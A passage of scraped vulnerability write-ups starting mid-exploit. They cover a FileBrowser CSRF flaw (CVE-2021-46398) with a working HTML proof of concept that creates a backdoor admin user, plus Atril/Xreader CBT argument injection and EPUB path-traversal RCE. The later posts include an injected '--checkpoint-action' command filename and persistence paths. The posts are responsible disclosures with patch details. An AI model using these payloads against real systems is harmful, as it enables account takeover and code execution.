<input type=”hidden” name='{“what”:”user”,”which”:[],”data”:{“scope”:”../../../../root/”,”locale”:”en”,”viewMode”:”mosaic”,”singleClick”:false,”sorting”:{“by”:””,”asc”:false},”perm”:{“admin”:true,”execute”:true,”create”:true,”rename”:true,”modify”:true,”delete”:true,”share”:true,”download”:true},”commands”:[],”hideDotfiles”:false,”username”:”pwned”,”password”:””,”rules”:[{“allow”:true,”path”:”../”,”regex”:false,”regexp”:{“raw”:””}}],”lockPassword”:false,”id”:0,”password”:”pwned”}}’ value=’test’>
      <input type=”submit” value=”CLICK ME!”>
    </form>

</body>

</html>

**Exploit-DB:** <https://www.exploit-db.com/exploits/50717>

**1. I started a filebrowser instance inside my ubuntu VM**

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/fb_csrf.png?w=942)

**2. I hosted the exploit on a simple HTTP server inside my host OS.**

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/fbrowser_csrf1-1.png?w=1024)
![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/fbrowser_csrf2.png?w=1024)

**3. When I click the “CLICK ME!” button, it sends a POST request in the background towards the filebrowser URL  and that creates a backdoor user named “pwned” with access to the “/root/” directory.**

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/fbrowser_csrf3.png?w=648)
![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/fbrowser_csrf4.png?w=1024)

Logged in as pwned user.

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/fbrowser_csrf_root.png?w=1024)

Root Cause:
1. X-Auth header is not validated properly

2. No Anti-CSRF token

3. Using content-type “text/plain” makes the attack possible

4. Origin header is not validated

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/fbrowser_csrf_request.png?w=756)

**RCE:**

Refer:

<https://filebrowser.org/configuration/command-runner>

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/command-runner.png?w=855)

**PATCH**

Update to the latest version as the flaw has been patched from v2.18.0

Commit: <https://github.com/filebrowser/filebrowser/commit/74b7cd8e81840537a8206317344f118093153e8d>

**CVE-2021-46398**

**Thank you.**

### Share this:

* [Twitter](https://febin0x4e4a.wordpress.com/2022/01/19/critical-csrf-in-filebrowser/?share=twitter "Click to share on Twitter")
* [Facebook](https://febin0x4e4a.wordpress.com/2022/01/19/critical-csrf-in-filebrowser/?share=facebook "Click to share on Facebook")
Like Loading...
### *Related*

[Uncategorized](https://febin0x4e4a.wordpress.com/category/uncategorised/)
[CVE-2021-46398](https://febin0x4e4a.wordpress.com/tag/cve-2021-46398/), [Exploit](https://febin0x4e4a.wordpress.com/tag/exploit/), [Hacking](https://febin0x4e4a.wordpress.com/tag/hacking/), [Security Research](https://febin0x4e4a.wordpress.com/tag/security-research/), [Vulnerability](https://febin0x4e4a.wordpress.com/tag/vulnerability/)

# Post navigation

[Tiny File Manager Authenticated RCE →](https://febin0x4e4a.wordpress.com/2022/01/23/tiny-file-manager-authenticated-rce/)

### Leave a comment [Cancel reply](/2022/01/19/critical-csrf-in-filebrowser/#respond)

Δ

Search for:

# Recent Posts

* [Privilege Escalation Vulnerability in Balena Etcher Software](https://febin0x4e4a.wordpress.com/2024/08/22/privilege-escalation-vulnerability-in-balena-etcher-software/)
* [CVE-2024-28739, CVE-2024-28740: XSS to One-Click RCE in Koha ILS](https://febin0x4e4a.wordpress.com/2024/03/07/xss-to-one-click-rce-in-koha-ils/)
* [CVE-2023-44452, CVE-2023-51698: CBT File Parsing Argument Injection that affected Popular Linux Distros](https://febin0x4e4a.wordpress.com/2024/01/17/cve-2023-44452-cve-2023-51698-cbt-file-parsing-argument-injection-that-affected-popular-linux-distros/)
* [CVE-2023-44451, CVE-2023-52076: EPUB File Parsing Directory Traversal RCE Vulnerability affecting popular distros](https://febin0x4e4a.wordpress.com/2024/01/17/cve-2023-44451-cve-2023-52076-epub-file-parsing-directory-traversal-rce-vulnerability-affecting-popular-distros/)
* [Zip Path Traversal in Asus Smartphone’s default FileManager App.](https://febin0x4e4a.wordpress.com/2024/01/10/zip-path-traversal-in-asus-smartphones-default-filemanager-app/)
# Recent Comments

# Archives

* [August 2024](https://febin0x4e4a.wordpress.com/2024/08/)
* [March 2024](https://febin0x4e4a.wordpress.com/2024/03/)
* [January 2024](https://febin0x4e4a.wordpress.com/2024/01/)
* [December 2023](https://febin0x4e4a.wordpress.com/2023/12/)
* [October 2023](https://febin0x4e4a.wordpress.com/2023/10/)
* [September 2023](https://febin0x4e4a.wordpress.com/2023/09/)
* [January 2023](https://febin0x4e4a.wordpress.com/2023/01/)
* [March 2022](https://febin0x4e4a.wordpress.com/2022/03/)
* [January 2022](https://febin0x4e4a.wordpress.com/2022/01/)
# Categories

* [Uncategorized](https://febin0x4e4a.wordpress.com/category/uncategorised/)

[Blog at WordPress.com.](https://wordpress.com/?ref=footer_blog)

* [Comment](https://febin0x4e4a.wordpress.com/2022/01/19/critical-csrf-in-filebrowser/#respond)
* Reblog
* Subscribe
  Subscribed

  + [![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/cropped-hacker-operate-laptop-cartoon-illustration_188898-166.jpg?w=50) febiNJ](https://febin0x4e4a.wordpress.com)

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Ffebin0x4e4a.wordpress.com%2F2022%2F01%2F19%2Fcritical-csrf-in-filebrowser%2F&signup_flow=account)
* Privacy
* + [![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/cropped-hacker-operate-laptop-cartoon-illustration_188898-166.jpg?w=50) febiNJ](https://febin0x4e4a.wordpress.com)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Ffebin0x4e4a.wordpress.com%2F2022%2F01%2F19%2Fcritical-csrf-in-filebrowser%2F&signup_flow=account)
  + [Copy shortlink](https://wp.me/pdF9Nn-2)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://febin0x4e4a.wordpress.com/2022/01/19/critical-csrf-in-filebrowser/)
  + [View post in Reader](https://wordpress.com/read/blogs/201901473/posts/2)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

##

##

Loading Comments...

Write a Comment...

Email (Required)

Name (Required)

Website

###

%d

![](https://pixel.wp.com/b.gif?v=noscript)
Design a site like this with WordPress.com[Get started](https://wordpress.com/start/?ref=marketing_bar)



=== Content from systemweakness.com_2e13aede_20250114_220752.html ===
[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2F865a3c34b8e7&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderCollection&source=---top_nav_layout_nav----------------------------------)

[Sign up](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fsystemweakness.com%2Fcritical-csrf-to-rce-in-filebrowser-865a3c34b8e7&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Fsystemweakness.com%2Fcritical-csrf-to-rce-in-filebrowser-865a3c34b8e7&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav-----------)

[Sign up](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fsystemweakness.com%2Fcritical-csrf-to-rce-in-filebrowser-865a3c34b8e7&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Fsystemweakness.com%2Fcritical-csrf-to-rce-in-filebrowser-865a3c34b8e7&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)
# CVE-2021–46398 Critical CSRF to RCE in FileBrowser

[![Febin](https://miro.medium.com/v2/resize:fill:88:88/1*zv7xcTwEdRt8qRgdc3iQOw.png)](https://febinj.medium.com/?source=post_page---byline--865a3c34b8e7--------------------------------)[![System Weakness](https://miro.medium.com/v2/resize:fill:48:48/1*gncXIKhx5QOIX0K9MGcVkg.jpeg)](https://systemweakness.com/?source=post_page---byline--865a3c34b8e7--------------------------------)

[Febin](https://febinj.medium.com/?source=post_page---byline--865a3c34b8e7--------------------------------)

·

[Follow](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2F1920561aec63&operation=register&redirect=https%3A%2F%2Fsystemweakness.com%2Fcritical-csrf-to-rce-in-filebrowser-865a3c34b8e7&user=Febin&userId=1920561aec63&source=post_page-1920561aec63--byline--865a3c34b8e7---------------------post_header-----------)

Published in[System Weakness](https://systemweakness.com/?source=post_page---byline--865a3c34b8e7--------------------------------)·4 min read·Jan 28, 2022

--

1

Listen

Share

![]()

**Introduction**

This is *Febin*, a security professional.

I used to pick random opensource software for my research, recently I took some web-based file management software as my research targets. There I found some popular web-based file managers, one of them was a software named “FileBrowser”. While poking around I was able to find an awesome vulnerability in the application that leads to account takeover, complete access to the filesystem, and command execution. This article is going to be on that vulnerability.

![]()

**Disclosure Timeline:**

October 16, 2021 — Contacted the vendor and reported the vulnerability

October 19, 2021 — Vendor replies back

October 30, 2021 — Vulnerability has been patched in version **v2.18.0**

February 4, 2022 — CVE ID was assigned. CVE-2021–46398

**Vendor/Software — Product Details**

Filebrowser provides a file managing interface within a specified directory and it can be used to upload, delete, preview, rename and edit your files. It allows the creation of multiple users and each user can have its own directory. It can be used as a standalone app or as a middleware.

Link**:** <https://filebrowser.org/>

**GitHub** **repo:** <https://github.com/filebrowser/filebrowser>

**The Vulnerability:** ***CSRF to RCE***

FileBrowser is a popular file manager/file managing interface developed in the Go language. Admin can create multiple users, even another Admin privileged user, and give access to any directory he wants, the user creation is handled by an endpoint “/api/users”.

The endpoint accepts input in JSON format to create users, but fails to verify that the “Content-Type” HTTP header, the Content-Type header’s value should be “application/json” but it accepts “text/plain” and that’s where the vulnerability arises. Also, the “Origin” is not validated and there are no anti-CSRF tokens implemented either.

Hence an attacker can easily exploit this vulnerability to create a backdoor user with admin privileges and access to the home directory or whichever directory the attacker wants to access, just by sending a malicious webpage URL to the legitimate admin and access the whole filesystem of the victim.

And an admin can run commands on the system, so this vulnerability leads to an RCE.

![]()

**Affected Versions: *v2.17.2 and below versions were affected. =< 2.17.2***

**Proof Of Concept:** **The below HTML code will exploit the Flaw**
<html>

<body style=”text-align:center;”>
 <h1> FileBrowser CSRF PoC by Febin </h1>
 <form action=”<http://ubuntu.local:8080/api/users>" method=”POST” enctype=”text/plain”>

<input type=”hidden” name=’{“what”:”user”,”which”:[],”data”:{“scope”:”../../../../root/”,”locale”:”en”,”viewMode”:”mosaic”,”singleClick”:false,”sorting”:{“by”:””,”asc”:false},”perm”:{“admin”:true,”execute”:true,”create”:true,”rename”:true,”modify”:true,”delete”:true,”share”:true,”download”:true},”commands”:[],”hideDotfiles”:false,”username”:”pwned”,”password”:””,”rules”:[{“allow”:true,”path”:”../”,”regex”:false,”regexp”:{“raw”:””}}],”lockPassword”:false,”id”:0,”password”:”pwned”}}’ value=’test’>
 <input type=”submit” value=”CLICK ME!”>
 </form>

</body>

</html>

**Exploit-DB:** <https://www.exploit-db.com/exploits/50717>

1. **I started a filebrowser instance inside my ubuntu VM**

![]()

**2. I hosted the exploit on a simple HTTP server inside my host OS.**

![]()![]()

**3. When I click the “CLICK ME!” button, it sends a POST request in the background towards the filebrowser URL and that creates a backdoor user named “pwned” with access to the “/root/” directory.**

![]()![]()

Logged in as pwned user.

![]()

Root Cause:
1. X-Auth header is not validated properly

2. No Anti-CSRF token

3. Using content-type “text/plain” makes the attack possible

4. Origin header is not validated

![]()

**RCE:**

Refer:

<https://filebrowser.org/configuration/command-runner>

![]()

**PATCH**

Update to the latest version as the flaw has been patched from v2.18.0

Commit: <https://github.com/filebrowser/filebrowser/commit/74b7cd8e81840537a8206317344f118093153e8d>

***CVE-2021–46398***

**Thank you.**

[Exploit](https://medium.com/tag/exploit?source=post_page-----865a3c34b8e7--------------------------------)[Exploitation](https://medium.com/tag/exploitation?source=post_page-----865a3c34b8e7--------------------------------)[Vulnerability Research](https://medium.com/tag/vulnerability-research?source=post_page-----865a3c34b8e7--------------------------------)[Security Research](https://medium.com/tag/security-research?source=post_page-----865a3c34b8e7--------------------------------)[Hacking](https://medium.com/tag/hacking?source=post_page-----865a3c34b8e7--------------------------------)

--

--

1

[![System Weakness](https://miro.medium.com/v2/resize:fill:96:96/1*gncXIKhx5QOIX0K9MGcVkg.jpeg)](https://systemweakness.com/?source=post_page---post_publication_info--865a3c34b8e7--------------------------------)[![System Weakness](https://miro.medium.com/v2/resize:fill:128:128/1*gncXIKhx5QOIX0K9MGcVkg.jpeg)](https://systemweakness.com/?source=post_page---post_publication_info--865a3c34b8e7--------------------------------)[## Published in System Weakness](https://systemweakness.com/?source=post_page---post_publication_info--865a3c34b8e7--------------------------------)[5.9K Followers](/followers?source=post_page---post_publication_info--865a3c34b8e7--------------------------------)·[Last published 13 hours ago](/the-silicon-valley-penetration-testing-methodology-blueprint-a008285bf669?source=post_page---post_publication_info--865a3c34b8e7--------------------------------)

System Weakness is a publication that specialises in publishing upcoming writers in cybersecurity and ethical hacking space. Our security experts write to make the cyber universe more secure, one vulnerability at a time.

[![Febin](https://miro.medium.com/v2/resize:fill:96:96/1*zv7xcTwEdRt8qRgdc3iQOw.png)](https://febinj.medium.com/?source=post_page---post_author_info--865a3c34b8e7--------------------------------)[![Febin](https://miro.medium.com/v2/resize:fill:128:128/1*zv7xcTwEdRt8qRgdc3iQOw.png)](https://febinj.medium.com/?source=post_page---post_author_info--865a3c34b8e7--------------------------------)[Follow](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2F1920561aec63&operation=register&redirect=https%3A%2F%2Fsystemweakness.com%2Fcritical-csrf-to-rce-in-filebrowser-865a3c34b8e7&user=Febin&userId=1920561aec63&source=post_page-1920561aec63--post_author_info--865a3c34b8e7---------------------follow_profile-----------)[## Written by Febin](https://febinj.medium.com/?source=post_page---post_author_info--865a3c34b8e7--------------------------------)[192 Followers](https://febinj.medium.com/followers?source=post_page---post_author_info--865a3c34b8e7--------------------------------)·[30 Following](https://medium.com/%40febinj/following?source=post_page---post_author_info--865a3c34b8e7--------------------------------)

CEH | CEH(Master) | eJPT | OSCP | CRTP |CyberSecurity Enthusiast | Security Researcher | Bug Hunter | Always seeks for knowledge

[Follow](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2F1920561aec63&operation=register&redirect=https%3A%2F%2Fsystemweakness.com%2Fcritical-csrf-to-rce-in-filebrowser-865a3c34b8e7&user=Febin&userId=1920561aec63&source=post_page-1920561aec63--post_author_info--865a3c34b8e7---------------------follow_profile-----------)
## Responses (1)

See all responses[Help](https://help.medium.com/hc/en-us?source=post_page-----865a3c34b8e7--------------------------------)[Status](https://medium.statuspage.io/?source=post_page-----865a3c34b8e7--------------------------------)[About](https://medium.com/about?autoplay=1&source=post_page-----865a3c34b8e7--------------------------------)[Careers](https://medium.com/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----865a3c34b8e7--------------------------------)[Press](pressinquiries%40medium.com?source=post_page-----865a3c34b8e7--------------------------------)[Blog](https://blog.medium.com/?source=post_page-----865a3c34b8e7--------------------------------)[Privacy](https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----865a3c34b8e7--------------------------------)[Terms](https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----865a3c34b8e7--------------------------------)[Text to speech](https://speechify.com/medium?source=post_page-----865a3c34b8e7--------------------------------)[Teams](https://medium.com/business?source=post_page-----865a3c34b8e7--------------------------------)



=== Content from febin0x4e4a.wordpress.com_de2c531b_20250115_123735.html ===

# [febiNJ](https://febin0x4e4a.wordpress.com/)

## InfoSec Enthusiast

Menu
[Skip to content](#content)

* [Home](https://febin0x4e4a.wordpress.com/)
* [About](https://febin0x4e4a.wordpress.com/about/)

Search

Search for:

# Vulnerability

# [CVE-2023-44452, CVE-2023-51698: CBT File Parsing Argument Injection that affected Popular Linux Distros](https://febin0x4e4a.wordpress.com/2024/01/17/cve-2023-44452-cve-2023-51698-cbt-file-parsing-argument-injection-that-affected-popular-linux-distros/)

[17th January 2024](https://febin0x4e4a.wordpress.com/2024/01/17/cve-2023-44452-cve-2023-51698-cbt-file-parsing-argument-injection-that-affected-popular-linux-distros/) / [FebiNJ](https://febin0x4e4a.wordpress.com/author/febin0x4e4a/)  / [Leave a comment](https://febin0x4e4a.wordpress.com/2024/01/17/cve-2023-44452-cve-2023-51698-cbt-file-parsing-argument-injection-that-affected-popular-linux-distros/#respond)

*A Critical One-Click RCE/Command Injection Vulnerability Affecting Popular Linux Operating Systems with MATE, Cinnamon, and some Xfce desktop Environments.*

My 9th and 11th CVEs

**Affected Operating Systems:**

Linux Mint
Kali Linux (Popular OS among Security professionals, and researchers)
Parrot OS (Popular OS among Security professionals, and researchers)
Ubuntu-Mate
Xubuntu
Fedora Cinnamon
Fedora Mate
Manjaro Mate
Manjaro Cinnamon
Ubuntu Kylin (Official Chinese Ubuntu)
Kylin OS V10 ( OS said to be used in the Chinese Government Sectors )

And other MATE, Cinnamon, and some Xfce desktop Environments.

Affected Software Component: All versions including the latest versions of Atril Document Viewer (Default Doc reader for MATE environment, one of the popular doc readers) and Xreader Document Viewer (Default doc reader in Linux Mint)

**Vulnerability Summary:**

This vulnerability allows remote attackers to execute arbitrary code on affected installations of Linux Mint Xreader. User interaction is required to exploit this vulnerability in that the target must visit a malicious page or open a malicious file.

The specific flaw exists within the parsing of CBT files. The issue results from the lack of proper validation of a user-supplied string before using it to execute a system call. An attacker can leverage this vulnerability to execute code in the context of the current user.

This vulnerability is due to a bad code segment in Atril and Xreader responsible for handling comic book documents (.cbr, .cbz, .cbt, .cb7). Comic book documents are just archives that contain images in it. The vulnerability here can be exploited using a maliciously crafted CBT document which is a TAR archive.

Root Cause – Vulnerable Code segment in both doc viewers (comics-document.c):

```

static const ComicBookDecompressCommand command_usage_def[] = {
        /* RARLABS unrar */
    {"%s p -c- -ierr --", "%s vb -c- -- %s", NULL             , FALSE, NO_OFFSET},

        /* GNA! unrar */
    {NULL               , "%s t %s"        , "%s -xf %s %s"   , FALSE, NO_OFFSET},

        /* unzip */
    {"%s -p -C --"      , "%s %s"          , NULL             , TRUE , OFFSET_ZIP},

        /* 7zip */
    {NULL               , "%s l -- %s"     , "%s x -y %s -o%s", FALSE, OFFSET_7Z},

        /* tar */
    {"%s -xOf"          , "%s -tf %s"      , NULL             , FALSE, NO_OFFSET},

    /* UNARCHIVER */
    {"unar -o -"        , "%s %s"          , NULL         , FALSE, NO_OFFSET}
};

```

By looking at the above code, we can see that there are shell commands used for decompression. Look at the /\* tar \*/ section, it actually calls the following shell command, “tar -xOf -tf ![]()“. This is to view/load each image inside the CBT document. This behavior can be exploited by using an option of tar program ‘–checkpoint-action’ to execute arbitrary commands on the target by naming one of the images inside the CBT document to something like ‘–checkpoint-action=EXEC=bash -c “whoami>/tmp/who.txt”;.jpg’.

This vulnerability was already found in Evince Document viewer (the default Doc reader of GNOME) back in 2017. Since Atril and Xreader are forks of Evince, this vulnerability was present in both Atril and Xreader. Atril’s team fixed the vulnerability at that time by adding a piece of code that quits Atril’s process if the CBT file with “–checkpoint-action=” in its name. The following was the patch (comics-document.c) (line – 983):

```

extract_argv (EvDocument *document, gint page)
{
    ComicsDocument *comics_document = COMICS_DOCUMENT (document);
    char **argv;
    char *command_line, *quoted_archive, *quoted_filename;
    GError *err = NULL;

    if (g_strrstr (comics_document->page_names->pdata[page], "--checkpoint-action="))
    {
        g_warning ("File unsupported\n");
        gtk_main_quit ();
    }

```

As you can see, it throws a “File Unsupported” message to the console and quits when it sees “–checkpoint-action=” in a page/filename. I noticed that this only works with an empty file or a really small image file, and if we provide a larger file with more bytes, the “gtk\_main\_quit ();” function fails, so it continues to run, thus executing the injected arbitrary command.

In the MATE desktop environment, many XFCE and lightweight desktop environments (including OS like Kali, Parrot, Xubuntu, Ubuntu Mate, Kylin, Fedora Mate, Manjaro Mate), this vulnerability can be exploited just by sending a link/URL because these Operating Systems/Environments has Atril and Atril has an additional component called atril-previewer that will trigger the exploit without even opening or clicking on the document. An attacker can craft a webpage that instantly downloads the crafted CBT file onto the target system when the target user visits the webpage and the latest Firefox browser nowadays downloads automatically by default without user confirmation, when the user navigates to his Downloads directory the payload will be executed, gives the attacker the shell.

In Linux Mint (Cinnamon Desktop Environment), the target user must open the document to trigger the payload because Linux Mint uses Xreader and Xreader doesn’t have a previewer.

**Exploit**: <https://github.com/febinrev/atril_cbt-inject-exploit.git>

Exploit Dependencies: poppler-utils
Please install poppler-utils before running the exploit script on your Linux machine (Kali preferred). Installation: apt install poppler-utils.

**Github Advisory on MATE Atril**: <https://github.com/mate-desktop/atril/security/advisories/GHSA-34rr-j8v9-v4p2>

**Zero Day Initiative Advisory on Mint Xreader**: <https://www.zerodayinitiative.com/advisories/ZDI-23-1836/>

Thanks for Reading!

# [CVE-2023-44451, CVE-2023-52076: EPUB File Parsing Directory Traversal RCE Vulnerability affecting popular distros](https://febin0x4e4a.wordpress.com/2024/01/17/cve-2023-44451-cve-2023-52076-epub-file-parsing-directory-traversal-rce-vulnerability-affecting-popular-distros/)

[17th January 202417th January 2024](https://febin0x4e4a.wordpress.com/2024/01/17/cve-2023-44451-cve-2023-52076-epub-file-parsing-directory-traversal-rce-vulnerability-affecting-popular-distros/) / [FebiNJ](https://febin0x4e4a.wordpress.com/author/febin0x4e4a/)  / [Leave a comment](https://febin0x4e4a.wordpress.com/2024/01/17/cve-2023-44451-cve-2023-52076-epub-file-parsing-directory-traversal-rce-vulnerability-affecting-popular-distros/#respond)

My 8th and 10th CVEs

**Slippy-book: EPUB File Parsing Directory Traversal Remote Code Execution**

### CVE-2023-44451 (Xreader), CVE-2023-52076(Atril)(Reserved):

RCE Vulnerability affected popular Linux Distros including Mint, Kali, Parrot, Manjaro etc. EPUB File Parsing Directory Traversal Remote Code Execution

A Critical Path traversal and Arbitrary file write vulnerability has been discovered in the default document viewer software of Linux’s MATE/ and Linux Mint affecting popular operating systems such as Kali Linux, Parrot Security OS, Ubuntu-Mate, Linux Mint, Xubuntu, and all the other Operating Systems that use MATE or Atril/Xreader as default doc viewer.

The vulnerability exists in Atril Document Viewer and Xreader Document Viewer which are the default document viewers of the MATE environment and Linux Mint respectively. Atril is the default document reader for Kali Linux, Ubuntu-Mate, Parrot Security OS, and Xubuntu, and Xreader is the default document reader for Linux Mint.

This vulnerability is capable of writing arbitrary files anywhere on the filesystem to which the user opening a crafted document has access, the only limitation is that this vulnerability cannot be exploited to overwrite existing files but that doesn’t stop an attacker from achieving Remote Command Execution on the target system.

I named this vulnerability “*Slippy-Book*“

**Severity**: CRITICAL

**Impact**: Remote Command Execution, System compromise

This can be used particularly against security researchers who mostly use Kali and Parrot OS and also desktop users who use Linux Mint.

Remote Command Execution can be achieved in many ways:

1. The most efficient way to achieve RCE is by placing a malicious .desktop entry under $HOME/.config/autostart/ directory, and the .desktop will execute when the user logs out and logs back in, the autostart/ directory acts as the startup folder in Windows, and it will execute all the .desktop entries that are present inside at startup. We can place an infinite number of .desktop files with random names under autostart/ directory to achieve RCE, no need to overwrite any file.
2. By writing the authorized\_keys file under the .ssh/ directory inside the user’s home, in this way, an attacker can immediately achieve Command Execution via SSH if the target system has SSH enabled.
3. RCE can be achieved in another way just by writing files like .bash\_profile, .bash\_login, .zshrc, .cshrc, .vimrc, .xsession under the user’s home directory. Many of these files might be missing in operating systems, it depends on the OS. In Ubuntu-mate and Linux Mint, .bash\_profile, and .bash\_login files won’t be present, and placing those files with malicious commands written inside under the user’s home directory will result in RCE if the user logs in to the system without GUI mode, like SSH login.
4. Another way to achieve control over the target system is by writing files in places like ~/.local/bin, ~/.local/lib/python3.9/site-packages/, ~/.local/lib/python3.10/site-packages/, ~/.local/lib/python3.11/site-packages/, ~/.local/share/applications/, /var/www/html/, /var/www/ and so on.

**[+] Finding the Vulnerability:**

I was researching archive file formats such as Zip, Tar, Rar, etc., and the software that works with archives, then I got the idea to get into the Ebook file format (.epub) because .epub files are really Zip archives with some XML, HTML and other files packed inside. Even though Epub files are just zip files, epub format has its own standards.

**[\*] How did I find the vulnerability?**

People have been exploiting Archives since the early 2000s, researchers are constantly looking into Archives and archiving software for vulnerabilities and Zero-day acquisition companies like Zerodium are willing to pay million-dollar bounties for zero-days in archives and archivers. So, I thought to give it a try. I am not a binary ninja or kernel exploitation specialist to pull off a highly complicated exploit chain that could give me a code execution or elevation of privilege. My approach was, “What is the dumbest thing that could possibly work”.

Path traversal is one of the most common vulnerabilities that affect Archives and software that deals with archives, Zip Slip is one such vulnerability that leads to arbitrary file overwrite and Code execution that was disclosed on the 5th of June 2018 by the Snyk Security team, Zip Slip was a widespread vulnerability affected many software and libraries that handle Zip archives. Path traversal in zip archives was an ancient bug in the wild even before that was disclosed by the Snyk Security team. It is still present in many software including some Android file managers.
Another such vulnerability was discovered in WinRar with the CVE Id CVE-2018-20250, in which a potential path traversal can be exploited to achieve RCE.

Archives were developed in a period when people not much cared about security, and that’s where all the problems began.

Knowing that Path traversals can be a problem in the archive, I started testing it out on EPUB. I started off by downloading a sample .epub file from the internet and started playing with it. Then I did something really interesting, I added my own files into the .epub file by using the “zip -u” command.

`$ zip -u sample1.epub hello.txt`

And then when I listed the contents of the EPUB archive using “unzip -l”, I was able to see my hello.txt was present inside the EPUB. Perfect! So what’s next? As I said above, my approach was, “What is the dumbest thing that could possibly work” so what I did next was add a bunch of Path Traversal gadgets (../../) at the beginning of my filename hello.txt.

I was using Kali Linux and logged in as root during the research on archives.
Then, I navigated to the directory graphically and clicked on the EPUB document, the document opened up and nothing happened but after that, I noticed something really interesting, the hello.txt file was present under my Kali Linux’s root (/). I tried overwriting existing files but that didn’t work.

Then, I tried changing the filename to something like ../../../../tmp/test.txt and that worked too, a file named test.txt was successfully created under /tmp upon opening the epub document. First I thought it was a vulnerability in Kali Linux and downloaded the latest ISO of Kali from their official site and built a VM to test it out. Guess what? It worked on the latest version of Kali too. The software responsible for opening epub files in Kali is Atril, I then went to Google to read more about Atril Document Viewer and found out that it is the default Document reader for MATE desktop environment. After knowing that, I immediately switched to my Parrot OS VM to reproduce the same vulnerability, and that worked in Parrot OS as well. I also tested it out on Ubuntu’s MATE variant called Ubuntu-MATE and found that it was also vulnerable. The MATE desktop environment itself is vulnerable.

I also tried to reproduce this on various other Linux distros with other Desktop Environments and found out that Linux Mint is also vulnerable.

#### [+] Achieving Remote Command Execution:

This vulnerability can’t be exploited to overwrite existing files, it can only create new files under any specified locations, but that doesn’t stop us from achieving RCE. I tried out using the vulnerability to write a .desktop entry under $HOME/.config/autostart and then I logged out and logged back in, the malicious .desktop entry got triggered and I got Remote Command Execution. I also tried placing an authorized\_keys file under .ssh/ directory and achieved RCE via SSH. Note: If a directory is not present it will create the directory automatically.

Who knows about the Ebook format? Hasn’t everyone switched to PDF?

The answer is no, EPUB is still a popular and powerful document format, but many people prefer PDF. Most of them are familiar with PDFs. So, I was trying to maximize this vulnerability impact. Another Interesting thing I noticed was, when renaming the .epub document to something.pdf, the vulnerable Document Viewer (Atril/Xreader) tries to open the something.pdf file and reads it as an EPUB document because it is responsible for reading both EPUB and PDF, it also supports many other document formats as well. In other words, we can rename our crafted something.epub to something.pdf and then send it to the target to achieve RCE on the target.

So everything is good, we could create an exploit that’ll craft an epub/pdf pair to write malicious .desktop entries under /home//.config/autostart/ directory. But there’s a small problem, the target user’s username is required for successful exploitation of this bug. What if we don’t know the username? No Easy RCE? Needs to guess Username? Needs to try random common usernames? Let’s see what I got..

Upon further analysis, I found out that we can use the /proc/self/cwd to access the user’s home directory if he downloads the crafted document and opens it somewhere inside his home directory such as the ~/Downloads/, ~/Documents/ directory. So we can exploit the path traversal bug to achieve RCE just by using the gadget ../../../../../proc/self/cwd/../.config/autostart/exploit.desktop.

I have created a fully working exploit for this vulnerability (exploit\_rce.sh) and a script to write and include custom files for path traversal (exploit\_file\_write.sh).

**Exploit**: <https://github.com/febinrev/slippy-book-exploit.git>

**Zero Day Initiative Advisory:** <https://www.zerodayinitiative.com/advisories/ZDI-23-1835/>

*Update the Document Viewers to the latest version on your Distros!*

Thanks for Reading.

# [Zip Path Traversal in Asus Smartphone’s default FileManager App.](https://febin0x4e4a.wordpress.com/2024/01/10/zip-path-traversal-in-asus-smartphones-default-filemanager-app/)

[10th January 2024](https://febin0x4e4a.wordpress.com/2024/01/10/zip-path-traversal-in-asus-smartphones-default-filemanager-app/) / [FebiNJ](https://febin0x4e4a.wordpress.com/author/febin0x4e4a/)  / [Leave a comment](https://febin0x4e4a.wordpress.com/2024/01/10/zip-path-traversal-in-asus-smartphones-default-filemanager-app/#respond)

**Zip Path traversal(ZipSlip) to arbitrary file write/overwrite in Asus default Android FileManager affecting all Asus Smartphones.**

This vulnerability is found in the latest version of the default file manager of Asus smartphones which comes pre-installed with the devices and also can’t be uninstalled. An attacker can create a crafted zip archive with path traversal to write/overwrite files in arbitrary locations on the target Smartphone. This vulnerability is dangerous as this can be abused to overwrite targetted files on the victim device or overwrite files that have patterns in the filenames like the photos taken from the camera, WhatsApp audio messages, WhatsApp Voice notes, Telegram Files, and much more. Also, Asus FileManager doesn’t prompt user confirmation before overwriting existing files which makes it easier for an attacker to exploit the vulnerability to overwrite existing files on the victim’s device.

**Severity**: *HIGH*
